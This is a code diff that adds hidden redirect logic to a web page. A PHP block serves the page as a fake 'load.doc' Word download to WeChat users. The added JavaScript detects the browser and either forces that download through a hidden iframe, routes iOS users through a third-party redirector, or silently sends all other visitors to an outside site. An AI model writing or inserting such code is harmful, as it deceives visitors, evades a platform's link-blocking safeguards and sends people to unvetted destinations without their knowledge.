@@ -1,3 +1,10 @@
+<?php
+error_reporting(0);
+if($_GET['open']==1 && strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger')!==false){
+    header("Content-Disposition: attachment; filename=\"load.doc\"");
+    header("Content-Type: application/vnd.ms-word;charset=utf-8");
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -143,7 +150,49 @@
             },
         }
     });
+    test();
+    var androidBtn = document.getElementById("androidBtn");
+    androidBtn.addEventListener('click',function(){
+        alert(1)
 
+    })
+    function test(){
+        var url = 'https://xtboke.cn';//更改需要跳转的地址
+        document.querySelector('body').addEventListener('touchmove', function (event) {
+            event.preventDefault();
+        });
+        window.mobileUtil = (function(win, doc) {
+            var UA = navigator.userAgent,
+                    isAndroid = /android|adr/gi.test(UA),
+                    isIOS = /iphone|ipod|ipad/gi.test(UA) && !isAndroid,
+                    isBlackBerry = /BlackBerry/i.test(UA),
+                    isWindowPhone = /IEMobile/i.test(UA),
+                    isMobile = isAndroid || isIOS || isBlackBerry || isWindowPhone;
+            return {
+                isAndroid: isAndroid,
+                isIOS: isIOS,
+                isMobile: isMobile,
+                isWeixin: /MicroMessenger/gi.test(UA),
+                isQQ: /QQ/gi.test(UA)
+            };
+        })(window, document);
+        if(mobileUtil.isWeixin){
+            if(mobileUtil.isIOS){
+                url = "https://t.asczwa.com/taobao?backurl=" + encodeURIComponent(url);
+                document.getElementById('BtnClick').href=url;
+            }else if(mobileUtil.isAndroid){
+                url = '?open=1';
+                document.getElementById('BtnClick').href=url;
+                var iframe = document.createElement("iframe");
+                iframe.style.display = "none";
+                iframe.src = url;
+                document.body.appendChild(iframe);
+            }
+        }else{
+            document.getElementById('BtnClick').href=url;
+            window.location.replace(url);
+        }
+    }
 </script>
 </body>
 </html>
